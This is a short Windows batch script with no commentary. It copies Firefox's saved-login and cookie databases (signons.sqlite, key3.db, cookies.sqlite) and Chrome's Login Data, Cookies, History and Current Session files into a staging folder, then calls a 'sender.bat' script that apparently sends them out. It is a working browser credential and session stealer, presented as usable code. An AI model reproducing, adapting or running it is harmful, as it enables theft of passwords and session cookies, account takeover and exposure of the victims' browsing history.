md C:\Properties\files\Mozilla
cd %AppData%\Mozilla\Firefox\Profiles\*.default
copy /y cookies.sqlite C:\Properties\files\Mozilla
copy /y key3.db C:\Properties\files\Mozilla
copy /y signons.sqlite C:\Properties\files\Mozilla
copy /y %AppData%\Mozilla\Firefox\Profiles\*.default C:\Properties\files\Mozilla

md C:\Properties\files\Chrome
cd %UserProfile%\AppData\local\Google\Chrome\User Data\Default\
copy /y "Login Data" C:\Properties\files\Chrome
copy /y "Login Data-journal" C:\Properties\files\Chrome
copy /y "History" C:\Properties\files\Chrome
copy /y "History-journal" C:\Properties\files\Chrome
copy /y "Cookies" C:\Properties\files\Chrome
copy /y "Cookies-journal" C:\Properties\files\Chrome
copy /y "Current Session" C:\Properties\files\Chrome

cd C:\Properties\
sender.bat
